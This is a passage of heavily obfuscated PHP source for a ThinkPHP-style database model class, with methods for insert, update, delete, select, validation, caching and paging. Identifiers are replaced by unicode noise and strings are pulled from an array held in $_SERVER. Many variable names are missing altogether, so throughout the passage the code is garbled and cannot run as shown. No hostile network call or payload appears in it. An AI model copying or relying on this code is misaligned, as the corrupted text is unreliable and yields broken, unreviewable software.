$; } public function __get($) { return isset($this->data[$]) ? $this->data[$] : null; } public function __isset($н) { return isset($this->data[$н]); } public function __unset($Ç) { unset($this->data[$Ç]); } public function __call($𾷇, $Ŧ) { $އ =& $_SERVER[ʯ]; if (in_array(strtolower($𾷇), $this->methods, !0)) { $this->options[strtolower($𾷇)] = $Ŧ[0]; return $this; } elseif (in_array(strtolower($𾷇), array($އ[307], $އ[308], $އ[309], $އ[310], $އ[311]), !0)) { $ƾ = isset($Ŧ[0]) ? $Ŧ[0] : $އ[212]; $ƾ = $this->db->parseKey($ƾ); return $this->getField(strtoupper($𾷇) . $އ[312] . $ƾ . $އ[313] . $𾷇, $އ[307]); } elseif (strtolower(substr($𾷇, 0, 5)) == $އ[314]) { $ƾ = think_parse_name(substr($𾷇, 5)); $[$ƾ] = $Ŧ[0]; return $this->where($)->find(); } elseif (strtolower(substr($𾷇, 0, 10)) == $އ[315]) { $Ӆ = think_parse_name(substr($𾷇, 10)); $[$Ӆ] = $Ŧ[0]; return $this->where($)->getField($Ŧ[1]); } elseif (isset($this->_scope[$𾷇])) { return $this->scope($𾷇, $Ŧ[0]); } elseif (method_exists($this, $𾷇)) { array_unshift($Ŧ, $𾷇); return call_user_func_array(array($this, $އ[316]), $Ŧ); } else { return call_user_func_array(array(parent, $𾷇), $Ŧ); } } protected function call() { $ =& $_SERVER[ʯ]; $С = func_get_args(); $տŃ = array_shift($С); $ = $տŃ; if (is_array($տŃ)) { $ = $տŃ[1]; $տŃ = $տŃ[0]; } $Ѳ = count($С) - 1; if (isset($С[$Ѳ]) && $С[$Ѳ] === $տŃ) { think_exception(__CLASS__ . $[4] . $տŃ . think_lang($[317])); return; } $С[] = $տŃ; if (method_exists($this, $[318])) { $ = call_user_func_array(array($this, $[319]), array($, $С)); if (!is_null($) && $ !== !1) { return $; } } $к = call_user_func_array(array($this, $տŃ), $С); if (method_exists($this, $[320])) { $ = call_user_func_array(array($this, $[321]), array($, $С, $к)); if ($) { return $; } } return $к; } protected function _initialize() { } protected function _facade($ٳͩ) { $᪌ =& $_SERVER[ʯ]; if (!empty($this->fields)) { foreach ($ٳͩ as $ => $򂥞) { if (is_array($this->fields) && !in_array($, $this->fields, !0)) { unset($ٳͩ[$]); } elseif (is_scalar($򂥞)) { $this->_parseType($ٳͩ, $); } } } if (!empty($this->options[$᪌[322]])) { $ٳͩ = array_map($this->options[$᪌[322]], $ٳͩ); unset($this->options[$᪌[322]]); } $this->_beforeWrite($ٳͩ); return $ٳͩ; } protected function _beforeWrite(&$х) { } public function add($ȵ = '', $ꡆ = array(), $㝝ʿ = false) { if (empty($ȵ)) { if (!empty($this->data)) { $ȵ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ʯ][323]); return !1; } } $ꡆ = $this->_parseOptions($ꡆ); $ȵ = $this->_facade($ȵ); if (!1 === $this->_beforeInsert($ȵ, $ꡆ)) { return !1; } $ã = $this->db->insert($ȵ, $ꡆ, $㝝ʿ); if (!1 !== $ã) { $ = $this->getLastInsID(); if ($) { $ȵ[$this->getPk()] = $; $this->_after_insert($ȵ, $ꡆ); return $; } $this->_after_insert($ȵ, $ꡆ); } return $ã; } protected function _beforeInsert(&$, $۩ߙ) { } protected function _after_insert($, $ڙ) { } public function addAll($гŠ, $ܪ = array(), $ߚ = false) { $ކ =& $_SERVER[ʯ]; if (empty($гŠ)) { $this->error = think_lang($ކ[323]); return !1; } $ܪ = $this->_parseOptions($ܪ); foreach ($гŠ as $ => $ψ) { $гŠ[$] = $this->_facade($ψ); } if (method_exists($this->db, $ކ[324])) { $ = $this->db->insertAll($гŠ, $ܪ, $ߚ); } else { $this->startTrans(); foreach ($гŠ as $ => $ψ) { $ = $this->db->insert($ψ, $ܪ, $ߚ); } $this->commit(); } if (!1 !== $) { $ = $this->getLastInsID(); if ($) { return $; } } return $; } public function selectAdd($ʜ = '', $ҫ = '', $ڿ = array()) { $ =& $_SERVER[ʯ]; $ڿ = $this->_parseOptions($ڿ); if (!1 === ($ = $this->db->selectInsert($ʜ ? $ʜ : $ڿ[$[325]], $ҫ ? $ҫ : $this->getTableName(), $ڿ))) { $this->error = think_lang($[326]); return !1; } else { return $; } } public function save($ = '', $ = array()) { $ׂ =& $_SERVER[ʯ]; if (empty($)) { if (!empty($this->data)) { $ = $this->data; $this->data = array(); } else { $this->error = think_lang($ׂ[323]); return !1; } } $ = $this->_facade($); $ = $this->_parseOptions($); $Ժ = $this->getPk(); if (!isset($[$ׂ[327]])) { if (isset($[$Ժ])) { $҃[$Ժ] = $[$Ժ]; $[$ׂ[327]] = $҃; unset($[$Ժ]); } else { $this->error = think_lang($ׂ[326]); return !1; } } if (is_array($[$ׂ[327]]) && isset($[$ׂ[327]][$Ժ])) { $ = $[$ׂ[327]][$Ժ]; } if (!1 === $this->_beforeUpdate($, $)) { return !1; } $˙ = $this->db->update($, $); if (!1 !== $˙) { if (isset($)) { $[$Ժ] = $; } $this->_afterUpdate($, $); } return $˙; } protected function _beforeUpdate(&$۠, $˾) { } protected function _afterUpdate($, $) { } public function delete($ś = array()) { $ =& $_SERVER[ʯ]; if (empty($ś) && empty($this->options[$[327]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ = $this->getPk(); if (is_numeric($ś) || is_string($ś)) { if (strpos($ś, $[60])) { $ߒ[$] = array($[328], $ś); } else { $ߒ[$] = $ś; } $this->options[$[327]] = $ߒ; } $ś = $this->_parseOptions(); if (is_array($ś[$[327]]) && isset($ś[$[327]][$])) { $ = $ś[$[327]][$]; } $ = $this->db->delete($ś); if (!1 !== $) { $͖ = array(); if (isset($)) { $͖[$] = $; } $this->_after_delete($͖, $ś); } return $; } protected function _after_delete($Ҁ, $) { } public function select($ = array()) { $ۡ =& $_SERVER[ʯ]; if (is_string($) || is_numeric($)) { $ = $this->getPk(); if (strpos($, $ۡ[60])) { $ծʚ[$] = array($ۡ[328], $); } else { $ծʚ[$] = $; } $this->options[$ۡ[327]] = $ծʚ; } elseif (!1 === $) { $ = $this->_parseOptions(); return $ۡ[329] . $this->db->buildSelectSql($) . $ۡ[330]; } $ = $this->_parseOptions(); $ = $this->db->select($); if (!1 === $) { return !1; } if (empty($)) { return null; } $this->_afterSelect($, $); return $; } protected function _afterSelect(&$, $) { } public function buildSql($䂡 = array()) { $ڐ =& $_SERVER[ʯ]; $䂡 = $this->_parseOptions($䂡); return $ڐ[329] . $this->db->buildSelectSql($䂡) . $ڐ[330]; } public function optionsValue($Б = null) { if (is_null($Б)) { return $this->options; } elseif (is_array($Б)) { $this->options = array_merge($this->options, $Б); } } protected function _parseOptions($Р = array()) { $ =& $_SERVER[ʯ]; if (is_array($Р)) { $Р = array_merge($this->options, $Р); } $this->options = array(); if (!isset($Р[$[331]])) { $Р[$[331]] = $this->getTableName(); $ = $this->fields; } else { $ = $this->getDbFields(); } if (!empty($Р[$[332]])) { $Р[$[331]] .= $[63] . $Р[$[332]]; } $Р[$[333]] = $this->name; if (isset($Р[$[327]]) && is_array($Р[$[327]]) && !empty($) && !isset($Р[$[334]]) && !isset($Р[$[331]])) { foreach ($Р[$[327]] as $ => $М) { $ = trim($); if (in_array($, $, !0)) { if (is_scalar($М)) { $this->_parseType($Р[$[327]], $); } } elseif (!is_numeric($) && $[11] != substr($, 0, 1) && !1 === strpos($, $[10]) && !1 === strpos($, $[312]) && !1 === strpos($, $[335]) && !1 === strpos($, $[336])) { unset($Р[$[327]][$]); } } } $this->_options_filter($Р); return $Р; } protected function _options_filter(&$ľ) { } protected function _parseType(&$ܯ, $咜) { $û =& $_SERVER[ʯ]; if (empty($this->options[$û[337]][$û[4] . $咜])) { $և = strtolower($this->fields[$û[304]][$咜]); if (!1 !== strpos($և, $û[338])) { } elseif (!1 === strpos($և, $û[339]) && !1 !== strpos($և, $û[340])) { $ܯ[$咜] = intval($ܯ[$咜]); } elseif (!1 !== strpos($և, $û[341]) || !1 !== strpos($և, $û[342])) { $ܯ[$咜] = floatval($ܯ[$咜]); } elseif (!1 !== strpos($և, $û[343])) { $ܯ[$咜] = (bool) $ܯ[$咜]; } } } public function find($Ⱥ = array()) { $ =& $_SERVER[ʯ]; if (is_numeric($Ⱥ) || is_string($Ⱥ)) { $[$this->getPk()] = intval($Ⱥ); $this->options[$[327]] = $; } $this->options[$[344]] = 1; $Ⱥ = $this->_parseOptions(); $܏ = $this->db->select($Ⱥ); if (!1 === $܏) { return !1; } if (empty($܏)) { return null; } $this->data = $܏[0]; $this->_afterFind($this->data, $Ⱥ); if (!empty($this->options[$[345]])) { return $this->returnResult($this->data, $this->options[$[345]]); } return $this->data; } protected function _afterFind(&$, $) { } protected function returnResult($, $ٴ = '') { $ =& $_SERVER[ʯ]; if ($ٴ) { if (is_callable($ٴ)) { return call_user_func($ٴ, $); } switch (strtolower($ٴ)) { case $[346]: return json_encode($); case $[347]: return xml_encode($); } } return $; } public function parseFieldsMap($, $ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ƥ => $Հ) { if ($ == 1) { if (isset($[$Հ])) { $[$ƥ] = $[$Հ]; unset($[$Հ]); } } else { if (isset($[$ƥ])) { $[$Հ] = $[$ƥ]; unset($[$ƥ]); } } } } return $; } public function setField($ߠ, $ג = '') { if (is_array($ߠ)) { $С = $ߠ; } else { $С[$ߠ] = $ג; } return $this->save($С); } public function setAdd($ж, $ = 1) { $ꮛ =& $_SERVER[ʯ]; $ = $ж . $ꮛ[348] . $; if ($ < 0) { $ = $ж . $; } return $this->setField($ж, array($ꮛ[349], $)); } public function getField($ј, $ = null) { $ۭ =& $_SERVER[ʯ]; $[$ۭ[325]] = $ј; $ = $this->_parseOptions($); $ј = trim($ј); if (strpos($ј, $ۭ[60])) { if (!isset($[$ۭ[344]])) { $[$ۭ[344]] = is_numeric($) ? $ : $ۭ[12]; } $ʤ = $this->db->select($); if (!empty($ʤ)) { $ = explode($ۭ[60], $ј); $ј = array_keys($ʤ[0]); $Ʃ = array_shift($ј); $ = array_shift($ј); $ = array(); $ = count($); foreach ($ʤ as $˨) { $蔭Ő = $˨[$Ʃ]; if (2 == $) { $[$蔭Ő] = $˨[$]; } else { $[$蔭Ő] = is_string($) ? implode($, $˨) : $˨; } } return $; } } else { if (!0 !== $) { $[$ۭ[344]] = is_numeric($) ? $ : 1; } if ($ === $ۭ[307]) { unset($[$ۭ[344]]); } $˨ = $this->db->select($); if (!empty($˨)) { if ($ === $ۭ[307]) { return reset($˨[0]); } if (!0 !== $ && 1 == $[$ۭ[344]]) { return reset($˨[0]); } foreach ($˨ as $ڐ) { $͜[] = $ڐ[$ј]; } return $͜; } } return null; } public function create($󳲃 = '', $ = '') { $ۥ =& $_SERVER[ʯ]; if (empty($󳲃)) { $󳲃 = $_POST; } elseif (is_object($󳲃)) { $󳲃 = get_object_vars($󳲃); } if (empty($󳲃) || !is_array($󳲃)) { $this->error = think_lang($ۥ[323]); return !1; } $󳲃 = $this->parseFieldsMap($󳲃, 0); $ = $ ? $ : (!empty($󳲃[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ۥ[325]])) { $Ǟ = $this->options[$ۥ[325]]; unset($this->options[$ۥ[325]]); } elseif ($ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ǟ = $this->insertFields; } elseif ($ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ǟ = $this->updateFields; } if (isset($Ǟ)) { if (is_string($Ǟ)) { $Ǟ = explode($ۥ[60], $Ǟ); } if (think_config($ۥ[350])) { $Ǟ[] = think_config($ۥ[351]); } foreach ($󳲃 as $ݶ => $Ë) { if (!in_array($ݶ, $Ǟ)) { unset($󳲃[$ݶ]); } } } if (!$this->autoValidation($󳲃, $)) { return !1; } if (!$this->autoCheckToken($󳲃)) { $this->error = think_lang($ۥ[352]); return !1; } if ($this->autoCheckFields) { $Ǟ = $this->getDbFields(); foreach ($󳲃 as $ݶ => $Ë) { if (!in_array($ݶ, $Ǟ)) { unset($󳲃[$ݶ]); } elseif (MAGIC_QUOTES_GPC && is_string($Ë)) { $󳲃[$ݶ] = stripslashes($Ë); } } } $this->autoOperation($󳲃, $); $this->data = $󳲃; return $󳲃; } public function autoCheckToken($) { $И =& $_SERVER[ʯ]; if (isset($this->options[$И[353]]) && !$this->options[$И[353]]) { return !0; } if (think_config($И[350])) { $ɹ = think_config($И[351]); if (!isset($[$ɹ]) || Session::get($ɹ)) { return !1; } list($, $Ϯ) = explode($И[11], $[$ɹ]); if ($Ϯ && Session::get($ɹ . $И[10] . $) === $Ϯ) { Session::remove($ɹ . $И[10] . $); return !0; } if (think_config($И[354])) { Session::remove($ɹ . $И[10] . $); } return !1; } return !0; } public function regex($ĭħ, $ň) { $㚀 =& $_SERVER[ʯ]; $Ω = array($㚀[355] => $㚀[356], $㚀[357] => $㚀[358], $㚀[359] => $㚀[360], $㚀[361] => $㚀[362], $㚀[363] => $㚀[364], $㚀[365] => $㚀[366], $㚀[367] => $㚀[368], $㚀[342] => $㚀[369], $㚀[370] => $㚀[371]); if (isset($Ω[strtolower($ň)])) { $ň = $Ω[strtolower($ň)]; } return preg_match($ň, $ĭħ) === 1; } private function autoOperation(&$͙, $߼) { $ؙ =& $_SERVER[ʯ]; if (!empty($this->options[$ؙ[372]])) { $ = $this->options[$ؙ[372]]; unset($this->options[$ؙ[372]]); } elseif (!empty($this->_auto)) { $ = $this->_auto; } if (isset($)) { foreach ($ as $) { if (empty($[2])) { $[2] = THINK_MODEL_INSERT; } if ($߼ == $[2] || $[2] == THINK_MODEL_BOTH) { switch (trim($[3])) { case $ؙ[373]: case $ؙ[374]: $ŉޛ = isset($[4]) ? (array) $[4] : array(); if (isset($͙[$[0]])) { array_unshift($ŉޛ, $͙[$[0]]); } if ($ؙ[373] == $[3]) { $͙[$[0]] = call_user_func_array($[1], $ŉޛ); } else { $͙[$[0]] = call_user_func_array(array(&$this, $[1]), $ŉޛ); } break; case $ؙ[325]: $͙[$[0]] = $͙[$[1]]; break; case $ؙ[375]: if ($ؙ[12] === $͙[$[0]]) { unset($͙[$[0]]); } break; case $ؙ[376]: default: $͙[$[0]] = $[1]; } if (!1 === $͙[$[0]]) { unset($͙[$[0]]); } } } } return $͙; } protected function autoValidation($͕, $ଜʒ) { $۱ =& $_SERVER[ʯ]; if (!empty($this->options[$۱[377]])) { $ = $this->options[$۱[377]]; unset($this->options[$۱[377]]); } elseif (!empty($this->_validate)) { $ = $this->_validate; } if (isset($)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ as $ => $Ϗ) { if (empty($Ϗ[5]) || $Ϗ[5] == THINK_MODEL_BOTH || $Ϗ[5] == $ଜʒ) { if (0 == strpos($Ϗ[2], $۱[378]) && strpos($Ϗ[2], $۱[379])) { $Ϗ[2] = think_lang(substr($Ϗ[2], 2, -1)); } $Ϗ[3] = isset($Ϗ[3]) ? $Ϗ[3] : THINK_EXISTS_VALIDATE; $Ϗ[4] = isset($Ϗ[4]) ? $Ϗ[4] : $۱[380]; switch ($Ϗ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($͕, $Ϗ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($۱[12] != trim($͕[$Ϗ[0]])) { if (!1 === $this->_validationField($͕, $Ϗ)) { return !1; } } break; default: if (isset($͕[$Ϗ[0]])) { if (!1 === $this->_validationField($͕, $Ϗ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ЪѴ, $) { if (!1 === $this->_validationFieldItem($ЪѴ, $)) { if ($this->patchValidate) { $this->error[$[0]] = $[2]; } else { $this->error = $[2]; return !1; } } return; } protected function _validationFieldItem($, $) { $ė =& $_SERVER[ʯ]; switch (strtolower(trim($[4]))) { case $ė[373]: case $ė[374]: $ = isset($[6]) ? (array) $[6] : array(); if (is_string($[0]) && strpos($[0], $ė[60])) { $[0] = explode($ė[60], $[0]); } if (is_array($[0])) { foreach ($[0] as $η) { $[$η] = $[$η]; } array_unshift($, $); } else { array_unshift($, $[$[0]]); } if ($ė[373] == $[4]) { return call_user_func_array($[1], $); } else { return call_user_func_array(array(&$this, $[1]), $); } case $ė[381]: return $[$[0]] == $[$[1]]; case $ė[382]: if (is_string($[0]) && strpos($[0], $ė[60])) { $[0] = explode($ė[60], $[0]); } $ = array(); if (is_array($[0])) { foreach ($[0] as $η) { $[$η] = $[$η]; } } else { $[$[0]] = $[$[0]]; } if (!empty($[$this->getPk()])) { $[$this->getPk()] = array($ė[383], $[$this->getPk()]); } if ($this->where($)->find()) { return !1; } return !0; default: return $this->check($[$[0]], $[1], $[4]); } } public function check($ҚΨ, $鼦ߧ, $΍Ό = "\x72\x65\x67\145\170") { $Ȉ =& $_SERVER[ʯ]; $΍Ό = strtolower(trim($΍Ό)); switch ($΍Ό) { case $Ȉ[7]: case $Ȉ[384]: $ = is_array($鼦ߧ) ? $鼦ߧ : explode($Ȉ[60], $鼦ߧ); return $΍Ό == $Ȉ[7] ? in_array($ҚΨ, $) : !in_array($ҚΨ, $); case $Ȉ[385]: case $Ȉ[386]: if (is_array($鼦ߧ)) { $آ = $鼦ߧ[0]; $ڜ = $鼦ߧ[1]; } else { list($آ, $ڜ) = explode($Ȉ[60], $鼦ߧ); } return $΍Ό == $Ȉ[385] ? $ҚΨ >= $آ && $ҚΨ <= $ڜ : $ҚΨ < $آ || $ҚΨ > $ڜ; case $Ȉ[387]: case $Ȉ[388]: return $΍Ό == $Ȉ[387] ? $ҚΨ == $鼦ߧ : $ҚΨ != $鼦ߧ; case $Ȉ[389]: $ = mb_strlen($ҚΨ, $Ȉ[390]); if (strpos($鼦ߧ, $Ȉ[60])) { list($آ, $ڜ) = explode($Ȉ[60], $鼦ߧ); return $ >= $آ && $ <= $ڜ; } else { return $ == $鼦ߧ; } case $Ȉ[391]: list($Ȉ, $ϰ) = explode($Ȉ[60], $鼦ߧ); if (!is_numeric($Ȉ)) { $Ȉ = strtotime($Ȉ); } if (!is_numeric($ϰ)) { $ϰ = strtotime($ϰ); } return NOW_TIME >= $Ȉ && NOW_TIME <= $ϰ; case $Ȉ[392]: return in_array(get_client_ip(), explode($Ȉ[60], $鼦ߧ)); case $Ȉ[393]: return !in_array(get_client_ip(), explode($Ȉ[60], $鼦ߧ)); case $Ȉ[380]: default: return $this->regex($ҚΨ, $鼦ߧ); } } public function query($枃, $ޙ = false) { $ּ =& $_SERVER[ʯ]; if (!is_bool($ޙ) && !is_array($ޙ)) { $ޙ = func_get_args(); array_shift($ޙ); } $枃 = str_replace(array($ּ[18], $ּ[394]), $ּ[63], $枃); $枃 = $this->parseSql($枃, $ޙ); return $this->db->query($枃); } public function execute($, $ = false) { if (!is_bool($) && !is_array($)) { $ = func_get_args(); array_shift($); } $ = $this->parseSql($, $); return $this->db->execute($); } protected function parseSql($ՠ, $֯) { $ =& $_SERVER[ʯ]; if (!0 === $֯) { $ = $this->_parseOptions(); $ՠ = $this->db->parseSql($ՠ, $); } elseif (is_array($֯)) { $֯ = array_map(array($this->db, $[395]), $֯); $ՠ = vsprintf($ՠ, $֯); } else { $ՠ = strtr($ՠ, array($[396] => $this->getTableName(), $[397] => think_config($[296]))); } $this->db->setModel($this->name); return $ՠ; } public function db($ = '', $ב = '', $½ = array()) { $ =& $_SERVER[ʯ]; if ($[12] === $ && $this->db) { return $this->db; } static $ɾۣ = array(); static $҈ = array(); if (!isset($҈[$]) || isset($҈[$]) && $ב && $ɾۣ[$] != $ב) { if (!empty($ב) && is_string($ב) && !1 === strpos($ב, $[8])) { $ב = think_config($ב); } $ = think_guid($ב); $҈[$] = Db::getInstance($ב); } elseif (NULL === $ב) { $҈[$]->close(); unset($҈[$]); return; } if (!empty($½)) { if (is_string($½)) { parse_str($½, $½); } foreach ($½ as $ => $彂) { $this->setProperty($, $彂); } } $ɾۣ[$] = $ב; $this->db = $҈[$]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ޣ = get_class($this); if ($ޣ == $_SERVER[ʯ][398]) { return $this->name; } $this->name = substr($ޣ, 0, -5); } return $this->name; } public function getTableName() { $ðϲ =& $_SERVER[ʯ]; if (empty($this->trueTableName)) { $Ȫ = !empty($this->tablePrefix) ? $this->tablePrefix : $ðϲ[12]; if (!empty($this->tableName)) { $Ȫ .= $this->tableName; } else { $Ȫ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ȫ); } return (!empty($this->dbName) ? $this->dbName . $ðϲ[10] : $ðϲ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ =& $_SERVER[ʯ]; return isset($this->fields[$[303]]) ? $this->fields[$[303]] : $this->pk; } public function getDbFields() { $ =& $_SERVER[ʯ]; if (isset($this->options[$[331]])) { $ = $this->db->getFields($this->options[$[331]]); return $ ? array_keys($) : !1; } if ($this->fields) { $ = $this->fields; unset($[$[302]], $[$[303]], $[$[304]], $[$[301]]); return $; } return !1; } public function data($ꑌ = '') { $΃ =& $_SERVER[ʯ]; if ($΃[12] === $ꑌ && !empty($this->data)) { return $this->data; } if (is_object($ꑌ)) { $ꑌ = get_object_vars($ꑌ); } elseif (is_string($ꑌ)) { parse_str($ꑌ, $ꑌ); } elseif (!is_array($ꑌ)) { think_exception(think_lang($΃[323])); } $this->data = $ꑌ; return $this; } public function join($܇) { $̧ =& $_SERVER[ʯ]; if (is_array($܇)) { $this->options[$̧[334]] = $܇; } elseif (!empty($܇)) { $this->options[$̧[334]][] = $܇; } return $this; } public function union($⸀, $Ԩ = false) { $ =& $_SERVER[ʯ]; if (empty($⸀)) { return $this; } if ($Ԩ) { $this->options[$[399]][$[400]] = !0; } if (is_object($⸀)) { $⸀ = get_object_vars($⸀); } if (is_string($⸀)) { $ɑ͆ = $⸀; } elseif (is_array($⸀)) { if (isset($⸀[0])) { $this->options[$[399]] = array_merge($this->options[$[399]], $⸀); return $this; } else { $ɑ͆ = $⸀; } } else { think_exception(think_lang($[323])); } $this->options[$[399]][] = $ɑ͆; return $this; } public function cache($ = true, $֡ = null, $ = '') { $Է =& $_SERVER[ʯ]; if (!1 !== $) { $this->options[$Է[401]] = array($Է[104] => $, $Է[391] => $֡, $Է[43] => $); } return $this; } public function field($˚, $Ĵ = false) { $ =& $_SERVER[ʯ]; if (!0 === $˚) { $傄 = $this->getDbFields(); $˚ = $傄 ? $傄 : $[212]; } elseif ($Ĵ) { if (is_string($˚)) { $˚ = explode($[60], $˚); } $傄 = $this->getDbFields(); $˚ = $傄 ? array_diff($傄, $˚) : $˚; } $this->options[$[325]] = $˚; return $this; } public function scope($Ԍ = '', $ = NULL) { $饸ͧ =& $_SERVER[ʯ]; if ($饸ͧ[12] === $Ԍ) { if (isset($this->_scope[$饸ͧ[47]])) { $ = $this->_scope[$饸ͧ[47]]; } else { return $this; } } elseif (is_string($Ԍ)) { $ = explode($饸ͧ[60], $Ԍ); $ = array(); foreach ($ as $猗) { if (!isset($this->_scope[$猗])) { continue; } $ = array_merge($, $this->_scope[$猗]); } if (!empty($) && is_array($)) { $ = array_merge($, $); } } elseif (is_array($Ԍ)) { $ = $Ԍ; } if (is_array($) && !empty($)) { $this->options = array_merge($this->options, array_change_key_case($)); } return $this; } public function where($ɞ, $ഴ = null) { $鈽 =& $_SERVER[ʯ]; if (!is_null($ഴ) && is_string($ɞ)) { if (!is_array($ഴ)) { $ഴ = func_get_args(); array_shift($ഴ); } $ഴ = array_map(array($this->db, $鈽[395]), $ഴ); $ɞ = vsprintf($ɞ, $ഴ); } elseif (is_object($ɞ)) { $ɞ = get_object_vars($ɞ); } elseif (is_array($ɞ)) { foreach ($ɞ as $͑ => $ݺ) { if ((is_numeric($͑) || !$͑) && is_string($ݺ)) { if (strpos($ݺ, $鈽[402]) === 0) { continue; } think_trace($鈽[403], $鈽[12], $鈽[59]); die; } } } if (is_string($ɞ) && $鈽[12] != $ɞ) { $弗 = array(); $弗[$鈽[404]] = $ɞ; $ɞ = $弗; } if (isset($this->options[$鈽[327]])) { $this->options[$鈽[327]] = array_merge($this->options[$鈽[327]], $ɞ); } else { $this->options[$鈽[327]] = $ɞ; } return $this; } public function limit($ք, $ = null) { $ʉ =& $_SERVER[ʯ]; $this->options[$ʉ[344]] = is_null($) ? $ք : $ք . $ʉ[60] . $; return $this; } public function page($𲷬, $Ͼڔ = null) { $ׇ =& $_SERVER[ʯ]; $this->options[$ׇ[405]] = is_null($Ͼڔ) ? $𲷬 : $𲷬 . $ׇ[60] . $Ͼڔ; return $this; } public function comment($绁´) { $this->options[$_SERVER[ʯ][406]] = $绁´; return $this; } public function setProperty($, $) { if (property_exists($this, $)) { $this->{$} = $; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\171\124\x69\x6d\145", "\164\x69\155\145", "\x69\x6e\x73\145\x72\x74\54\x75\x70\x64\x61\x74\145", "\x66\x75\156\143\x74\151\x6f\156"), array("\x63\x72\145\x61\164\145\x54\x69\x6d\145", "\164\x69\x6d\x65", "\151\156\163\145\162\x74", "\146\x75\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($) { $this->dataAuto = $; } public function __construct($ˋ = '', $ = '', $Ơ = '') { parent::__construct($ˋ, $, $Ơ); } protected $tableMeta = array(); protected function _beforeInsert(&$ƙ, $) { $Ʀ =& $_SERVER[ʯ]; if (!$this->checkDataAutoHas($Ʀ[407])) { return; } $this->dataBeforeFilter($ƙ, $Ʀ[407]); } protected function _beforeUpdate(&$̸, $) { $ҵ =& $_SERVER[ʯ]; if (!$this->checkDataAutoHas($ҵ[408])) { return; } $this->dataBeforeFilter($̸, $ҵ[408]); } protected function _afterSelect(&$ઐ, $ϒ) { if (!is_array($ઐ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ʯ][409])) { return; } foreach ($ઐ as &$ѧ) { $this->dataAfterFilter($ѧ); } unset($ѧ); } protected function _afterFind(&$߸, $ʠ) { if (!is_array($߸)) { return; } if (!$this->checkDataAutoHas($_SERVER[ʯ][409])) { return; } $this->dataAfterFilter($߸); } public static function textEncode($Ç㒼) { if (!$Ç㒼) { return $Ç㒼; } $͆۸ = json_encode($Ç㒼); $͆۸ = preg_replace_callback($_SERVER[ʯ][410], function ($) { return addslashes($[0]); }, $͆۸); return json_decode($͆۸); } public static function textDecode($Ƒ) { $䟥 =& $_SERVER[ʯ]; $ؼٵ = json_encode($Ƒ); $ؼٵ = preg_replace_callback($䟥[411], function ($) { return $_SERVER[ʯ][107]; }, $ؼٵ); return json_decode($ؼٵ); } public function setAutoIncrement($) { $ = array($this->getPk() => $); $ = $this->data($)->add(); if ($) { $this->delete($); } } public function getAutoIncrement() { $⻂ = $this->getTableName(); $ܩ = $this->max($this->getPk()); $ = $this->query("\163\x68\x6f\167\x20\164\x61\142\x6c\x65\40\x73\164\x61\164\165\x73\x20\167\150\145\162\x65\x20\x4e\141\155\x65\x3d\47{$⻂}\47"); $ėŴ = $[0][$_SERVER[ʯ][412]]; $ = max($ܩ, $ėŴ); return $; } protected function _callBefore($, $) { return $this->cacheCallCheck($, $, !1); } protected function _callAfter($Ͷ, $) { return $this->cacheCallCheck($Ͷ, $, !0); } protected function cacheFunctionAlias($) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ڛ, $, $׺ = false) { $ = $this->cacheFunctionAlias($); if (!$) { return; } foreach ($ as $܌ => $) { $צ = $[0]; $ = explode($_SERVER[ʯ][60], $[1]); if ($ڛ == $܌) { return $this->cacheFunctionGet($܌, $צ); } if ($׺ && in_array($ڛ, $)) { $this->cacheFunctionClear($܌, $צ); } } } public function cacheFunctionGet($, $ݦ) { $ = $this->cacheKeyMake($, $ݦ); $؏ = Cache::get($); if (!is_array($؏)) { $؏ = call_user_func_array(array($this, $), array($ݦ, !0)); Cache::set($, $؏); } return $؏; } public function cacheFunctionClear($И, $) { $Ӗ = $; if (!is_array($)) { $Ӗ = array($); } foreach ($Ӗ as $) { $ = $this->cacheKeyMake($И, $); Cache::remove($); } } private function cacheKeyMake($Ӄ, $) { $؃ =& $_SERVER[ʯ]; return get_class($this) . $؃[11] . $Ӄ . $؃[413] . $; } protected function selectPageReset() { $ =& $_SERVER[ʯ]; if (isset($GLOBALS[$[414]])) { return; } $GLOBALS[$[414]] = isset($GLOBALS[$[7]][$[415]]) ? $GLOBALS[$[7]][$[415]] : !1; $GLOBALS[$[416]] = isset($GLOBALS[$[7]][$[405]]) ? $GLOBALS[$[7]][$[405]] : !1; $GLOBALS[$[7]][$[415]] = !1; $GLOBALS[$[7]][$[405]] = !1; } protected function selectPageRestore() { $ =& $_SERVER[ʯ]; if (!isset($GLOBALS[$[414]])) { return; } $GLOBALS[$[7]][$[415]] = $GLOBALS[$[414]]; $GLOBALS[$[7]][$[405]] = $GLOBALS[$[416]]; if ($GLOBALS[$[7]][$[415]] === !1) { unset($GLOBALS[$[7]][$[415]]); } if ($GLOBALS[$[7]][$[405]] === !1) { unset($GLOBALS[$[7]][$[405]]); } unset($GLOBALS[$[414]]); unset($GLOBALS[$[416]]); } protected function selectPage($ = 200, $ = 1) { $ʮ =& $_SERVER[ʯ]; global $in; $ǈ = $this->optionsValue(); $ = 50000; $ = isset($in[$ʮ[415]]) && $in[$ʮ[415]] ? $in[$ʮ[415]] : $; if 